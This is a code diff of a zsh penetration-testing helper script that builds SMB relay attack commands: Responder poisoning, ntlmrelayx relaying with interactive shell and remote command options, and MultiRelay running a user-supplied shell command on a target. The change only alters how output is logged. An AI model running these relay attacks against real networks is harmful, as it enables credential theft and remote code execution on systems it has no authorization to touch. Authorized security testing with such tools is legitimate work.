@@ -40,7 +40,7 @@ nb-ad-smb-relay-responder() {
     __check-project
     nb-vars-set-iface
 
-    print -z "sudo responder -I ${__IFACE} -dwPv | tee -a $(domadpath)/responder-smb-relay.txt"
+    print -z "sudo responder -I ${__IFACE} -dwPv | tee $(domadpath)/responder-smb-relay.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay() {
@@ -48,7 +48,7 @@ nb-ad-smb-relay-ntlmrelay() {
 	  __ask "Enter a targets list file"
 	  local targets && __askvar targets TARGETS
 
-    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support | tee -a $(domadpath)/ntlmrelayx.txt"
+    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support | tee $(domadpath)/ntlmrelayx.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay-shell() {
@@ -56,7 +56,7 @@ nb-ad-smb-relay-ntlmrelay-shell() {
 	  __ask "Enter a targets list file"
 	  local targets && __askvar targets TARGETS
 
-    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i | tee -a $(domadpath)/ntlmrelayx.txt"
+    print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -i | tee $(domadpath)/ntlmrelayx-shell.txt"
 }
 
 nb-ad-smb-relay-ntlmrelay-whoami() {
@@ -64,7 +64,7 @@ nb-ad-smb-relay-ntlmrelay-whoami() {
 	  __ask "Enter a targets list file"
 	  local targets && __askvar targets TARGETS
 
-	  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c 'whoami' | tee -a $(domadpath)/ntlmrelayx.txt"
+	  print -z "sudo ntlmrelayx.py -tf ${targets} -smb2support -c 'whoami' | tee $(domadpath)/ntlmrelayx-whoami.txt"
 }
 
 nb-ad-smb-relay-multirelay-command() {
@@ -74,5 +74,5 @@ nb-ad-smb-relay-multirelay-command() {
 	  __ask "Enter a shell command to execute"
 	  local command && __askvar command COMMAND
 
-	  print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL | tee -a $(domadpath)/responder-multirelay.txt"
+	  print -z "responder-multirelay -t ${__RHOST} -c ${command} -u ALL | tee $(domadpath)/responder-multirelay.txt"
 }
